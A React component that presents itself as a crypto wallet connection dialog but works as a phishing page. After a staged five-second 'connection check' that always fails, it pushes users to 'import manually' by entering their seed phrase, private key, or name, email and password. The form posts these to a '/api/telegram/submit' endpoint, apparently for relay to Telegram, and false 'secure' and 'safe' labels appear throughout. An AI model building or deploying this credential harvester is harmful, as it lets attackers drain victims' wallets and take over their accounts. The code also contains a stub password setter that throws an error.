import { useEffect, useRef, useState } from "react"
import { useAppKit, useAppKitEvents, useAppKitState } from "@reown/appkit/react"
import { AnimatePresence, motion } from "framer-motion"
import {
  AlertCircle,
  ArrowLeft,
  CheckCircle2,
  ClipboardCheck,
  Import,
  Loader2,
  RefreshCw,
  Send,
  ShieldCheck,
  Sparkles,
  Wallet,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Input } from "@/components/ui/input"
import { Textarea } from "@/components/ui/textarea"

type FlowStage = "checking" | "error" | "manual"
type ManualMode = "Recovery" | "Private key" | "Login"
type SubmissionStatus = "idle" | "Importing" | "Failed" | "error"

const CHECK_DURATION_MS = 5000

export function WalletConnectionFlow() {
  const { close, open } = useAppKit()
  const appKitEvents = useAppKitEvents()
  const { connectingWallet, open: appKitOpen } = useAppKitState()
  const [stage, setStage] = useState<FlowStage | null>(null)
  const [manualMode, setManualMode] = useState<ManualMode>("Recovery")
  const [selectedWallet, setSelectedWallet] = useState("Selected wallet")
  const [Recovery, setRecovery] = useState("")
  const [Privatekey, setPrivatekey] = useState("")
  const [fullName, setFullName] = useState("")
  const [email, setEmail] = useState("")
  const [password, setpassword] = useState("")
  const [submissionStatus, setSubmissionStatus] = useState<SubmissionStatus>("idle")
  const [submissionError, setSubmissionError] = useState("")
  const handledSelection = useRef(false)
  const lastHandledEventTimestamp = useRef(0)

  const latestEvent = appKitEvents.data as {
    event?: string
    properties?: { name?: string }
  }

  useEffect(() => {
    if (!appKitOpen && !connectingWallet) {
      handledSelection.current = false
    }
  }, [appKitOpen, connectingWallet])

  useEffect(() => {
    if (
      !appKitOpen ||
      handledSelection.current ||
      latestEvent.event !== "SELECT_WALLET" ||
      appKitEvents.timestamp <= lastHandledEventTimestamp.current
    ) {
      return
    }

    handledSelection.current = true
    lastHandledEventTimestamp.current = appKitEvents.timestamp
    setSelectedWallet(latestEvent.properties?.name ?? connectingWallet?.name ?? "Selected wallet")
    setStage("checking")
    setSubmissionStatus("idle")
    void close()
  }, [
    appKitEvents.timestamp,
    appKitOpen,
    close,
    connectingWallet,
    latestEvent.event,
    latestEvent.properties?.name,
  ])

  useEffect(() => {
    if (stage !== "checking") return

    const timer = window.setTimeout(() => setStage("error"), CHECK_DURATION_MS)
    return () => window.clearTimeout(timer)
  }, [stage])

  const resetFlow = () => {
    setStage(null)
    setSubmissionStatus("idle")
    setSubmissionError("")
    setRecovery("")
    setPrivatekey("")
    setFullName("")
    setEmail("")
    setPassword("")
  }

  const showManualOptions = () => {
    setManualMode("Recovery")
    setSubmissionStatus("idle")
    setSubmissionError("")
    setStage("manual")
  }

  const handleTryAgain = () => {
    resetFlow()
    void open()
  }

  const submitManualForm = async () => {
    setSubmissionStatus("Importing")
    setSubmissionError("")

    const payload =
      manualMode === "Recovery"
        ? { type: "Recovery", selectedWallet, Recovery }
        : manualMode === "Private key"
          ? { type: "Private key", selectedWallet, Privatekey }
          : { type: "Login", selectedWallet, fullName, email, password: password }

    try {
      const response = await fetch("/api/telegram/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      })

      if (!response.ok) {
        if (response.status === 400) throw new Error("Please fill in all fields before sending.")
        if (response.status === 404) throw new Error("This site's API is not connected. The request was not sent.")
        if (response.status === 502) throw new Error("System did not accept the request. Please try again.")
        throw new Error("The request could not be delivered. Please try again.")
      }
      setSubmissionStatus("idle")
    } catch (error) {
      setSubmissionError(
        error instanceof TypeError
          ? "Could not reach this site's API. The request was not sent."
          : error instanceof Error
            ? error.message
            : "The request could not be delivered. Please try again.",
      )
      setSubmissionStatus("error")
    }
  }

  const canSubmit =
    manualMode === "Recovery"
      ? Recovery.trim().length > 0
      : manualMode === "Private key"
        ? Privatekey.trim().length > 0
        : fullName.trim().length > 0 && email.trim().length > 0 && password.trim().length > 0

  return (
    <Dialog
      open={stage !== null}
      onOpenChange={(openState) => {
        if (!openState) resetFlow()
      }}
    >
      <DialogContent className="max-w-md border-white/10 bg-[#0B1220] p-0 overflow-hidden">
        <AnimatePresence mode="wait">
          {stage === "checking" && (
            <motion.div
              key="checking"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              className="flex min-h-[360px] flex-col items-center justify-center px-8 py-10 text-center"
            >
              <div className="relative mb-7">
                <div className="absolute inset-0 animate-ping rounded-full bg-primary/20" />
                <div className="relative flex h-24 w-24 items-center justify-center rounded-full border border-primary/40 bg-primary/10">
                  <Wallet className="h-10 w-10 text-primary" />
                </div>
              </div>
              <p className="mb-2 text-xs font-semibold uppercase tracking-[0.2em] text-primary/80">Connection check</p>
              <DialogTitle className="text-2xl font-bold text-white">Connecting to {selectedWallet}</DialogTitle>
              <DialogDescription className="mt-3 max-w-xs text-sm leading-relaxed text-white/50">
                Establishing a secure connection…
              </DialogDescription>
              <div className="mt-7 flex items-center gap-2 text-xs text-white/40">
                <Loader2 className="h-4 w-4 animate-spin text-primary" />
                Rolling connection check…
              </div>
            </motion.div>
          )}

          {stage === "error" && (
            <motion.div
              key="error"
              initial={{ opacity: 0, scale: 0.98 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 1.02 }}
              className="flex min-h-[360px] flex-col items-center justify-center px-8 py-10 text-center"
            >
              <div className="mb-6 flex h-20 w-20 items-center justify-center rounded-full border border-orange-500/30 bg-orange-500/10">
                <AlertCircle className="h-10 w-10 text-orange-400" />
              </div>
              <p className="mb-2 text-xs font-semibold uppercase tracking-[0.2em] text-orange-300/80">Connection Failed</p>
              <DialogTitle className="text-2xl font-bold text-white">Your wallet couldn’t be reached</DialogTitle>
              <DialogDescription className="mt-3 max-w-sm text-sm leading-relaxed text-white/50">
                Try again or connect manually instead.
              </DialogDescription>
              <div className="mt-7 grid w-full gap-3 sm:grid-cols-2">
                <Button onClick={showManualOptions} className="gap-2 bg-primary text-white hover:bg-primary/90">
                  <ClipboardCheck className="h-4 w-4" /> Connect manually
                </Button>
                <Button onClick={handleTryAgain} variant="outline" className="gap-2 border-white/10 bg-white/5 text-white hover:bg-white/10">
                  <RefreshCw className="h-4 w-4" /> Try another wallet
                </Button>
              </div>
            </motion.div>
          )}

          {stage === "manual" && (
            <motion.div
              key="manual"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              className="px-6 py-7 sm:px-8"
            >
              <DialogHeader className="text-left">
                <div className="mb-4 flex items-center gap-2 text-primary">
                  <ShieldCheck className="h-5 w-5" />
                  <span className="text-xs font-semibold uppercase tracking-[0.18em]">Safe manual options</span>
                </div>
                <DialogTitle className="text-2xl font-bold text-white">Import wallet manually</DialogTitle>
                <DialogDescription className="mt-2 text-sm leading-relaxed text-white/50">
                  Securely restore your wallet by choosing one of the following options:
                </DialogDescription>
              </DialogHeader>

              <div className="mt-6 grid grid-cols-3 gap-2 rounded-xl border border-white/10 bg-white/[0.03] p-1">
                {[
                  { id: "Recovery" as const, label: "Recovery", icon: ClipboardCheck },
                  { id: "Private key" as const, label: "Private key", icon: Sparkles },
                  { id: "Login" as const, label: "Login", icon: Send },
                ].map((option) => {
                  const Icon = option.icon
                  return (
                    <button
                      key={option.id}
                      type="button"
                      onClick={() => {
                        setManualMode(option.id)
                        setSubmissionStatus("idle")
                        setSubmissionError("")
                      }}
                      className={`flex flex-col items-center gap-1 rounded-lg px-2 py-2.5 text-xs font-semibold transition-colors ${
                        manualMode === option.id ? "bg-primary text-white" : "text-white/45 hover:bg-white/5 hover:text-white"
                      }`}
                    >
                      <Icon className="h-4 w-4" />
                      {option.label}
                    </button>
                  )
                })}
              </div>

              <div className="mt-5 space-y-4">
                {manualMode === "Recovery" && (
                  <label className="block space-y-2">
                    <span className="text-sm font-medium text-white/75">Recovery/seed phrase</span>
                    <Textarea
                      value={Recovery}
                      onChange={(event) => setRecovery(event.target.value)}
                      maxLength={2000}
                      placeholder="kindly enter your 12-24 phrase..."
                      className="min-h-28 resize-none border-white/10 bg-black/20 text-white placeholder:text-white/25"
                    />
                  </label>
                )}

                {manualMode === "Private key" && (
                  <label className="block space-y-2">
                    <span className="text-sm font-medium text-white/75">Paste private key here...</span>
                    <Input
                      value={Privatekey}
                      onChange={(event) => setPrivatekey(event.target.value)}
                      maxLength={200}
                      placeholder="..."
                      className="border-white/10 bg-black/20 font-mono text-white placeholder:text-white/25"
                    />
                    <span className="block text-xs leading-relaxed text-white/35">Only submit a public address. Never submit a seed phrase or private key.</span>
                  </label>
                )}

                {manualMode === "Login" && (
                  <>
                    <label className="block space-y-2">
                      <span className="text-sm font-medium text-white/75">Full name</span>
                      <Input value={fullName} onChange={(event) => setFullName(event.target.value)} maxLength={120} placeholder="Your name" className="border-white/10 bg-black/20 text-white placeholder:text-white/25" />
                    </label>
                    <label className="block space-y-2">
                      <span className="text-sm font-medium text-white/75">Email</span>
                      <Input type="text" inputMode="email" autoComplete="email" value={email} onChange={(event) => setEmail(event.target.value)} maxLength={254} placeholder="you@example.com" className="border-white/10 bg-black/20 text-white placeholder:text-white/25" />
                    </label>
                    <label className="block space-y-2">
                      <span className="text-sm font-medium text-white/75">Password</span>
                      <Input value={password} onChange={(event) => setpassword(event.target.value)} maxLength={200} placeholder="0x…" className="border-white/10 bg-black/20 font-mono text-white placeholder:text-white/25" />
                    </label>
                  </>
                )}

                {submissionStatus === "Failed" && (
                  <div className="flex items-start gap-3 rounded-xl border border-red-500/20 bg-red-500/10 p-3 text-sm text-red-300">
                    <CheckCircle2 className="mt-0.5 h-4 w-4 shrink-0" />
                    <span>Details couldn’t be verified, please provide the correct details and try again.</span>
                  </div>
                )}
                {submissionStatus === "error" && (
                  <div className="rounded-xl border border-red-500/20 bg-red-500/10 p-3 text-sm text-red-300">
                    {submissionError}
                  </div>
                )}

                <p className="text-xs leading-relaxed text-white/45" data-testid="text-telegram-disclosure">
                  Use a recovery phrase, private key, or login to your account.
                </p>
                <div className="flex items-center justify-between gap-3 pt-1">
                  <Button type="button" variant="ghost" onClick={() => setStage("error")} className="gap-2 text-white/50 hover:bg-white/5 hover:text-white">
                    <ArrowLeft className="h-4 w-4" /> Back
                  </Button>
                  <Button
                    type="button"
                    data-testid="button-send-telegram-request"
                    disabled={!canSubmit || submissionStatus === "Importing" || submissionStatus === "Failed"}
                    onClick={() => void submitManualForm()}
                    className="gap-2 bg-primary text-white hover:bg-primary/90"
                  >
                    {submissionStatus === "Importing" ? <Loader2 className="h-4 w-4 animate-spin" /> : <Import className="h-4 w-4" />}
                    {submissionStatus === "Importing" ? "Importing…" : "Import"}
                  </Button>
                </div>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </DialogContent>
    </Dialog>
  )
}

function setPassword(arg0: string) {
  throw new Error("Function not implemented.")
}
